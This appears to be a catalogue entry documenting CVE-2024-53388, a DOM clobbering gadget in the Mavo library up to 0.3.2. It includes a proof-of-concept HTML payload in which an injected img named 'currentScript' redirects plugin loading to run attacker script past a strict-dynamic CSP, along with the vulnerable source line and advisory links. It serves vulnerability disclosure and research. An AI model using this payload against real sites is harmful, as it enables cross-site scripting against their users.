---
description: Mavo is an HTML-based language for building small scale data-driven websites without programming knowledge (no JS, no backends needed!), just by writing HTML. For JavaScript developers (who like HTML), Mavo can also be used as a declarative, reactive front-end framework to make UI development easier.
github: mavoweb/mavo
gadgets:
  ≤0.3.2:
    cve: CVE-2024-53388
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - src-attr
      - strict-dynamic-csp
      - before-func-call
    pocs:
      - description: The [Mavo](https://github.com/mavoweb/mavo)'s library was using `document.currentScript` as a reference to load plugins.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/index.js">

          <script nonce="secret" src="https://get.mavo.io/stable/mavo.js"></script>
          <script nonce="secret">
          (function ($, $$) {
              Mavo.Plugins.register("myplugin", {
                  dependencies: [ "index.js" ],
              });
          })(Bliss, Bliss.$);
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/mavoweb/mavo/blob/78efe2b9cadd09c1d131b8afd5fe2f38d5cfa8c7/src/plugins.js#L95">https://github.com/mavoweb/mavo/blob/78efe2b9cadd09c1d131b8afd5fe2f38d5cfa8c7/src/plugins.js#L95</a>

      ```javascript
      if (o.dependencies) {
          let base = document.currentScript? document.currentScript.src : location;
          let dependencies = o.dependencies.map(url => Mavo.load(url, base));
          ready.push(...dependencies);
      }
      ```
    links:
      - https://github.com/advisories/GHSA-3mf5-r4hg-hfx9
      - https://gist.github.com/jackfromeast/a61a5429a97985e7ff4c1d39e339d5d8
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mavo.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
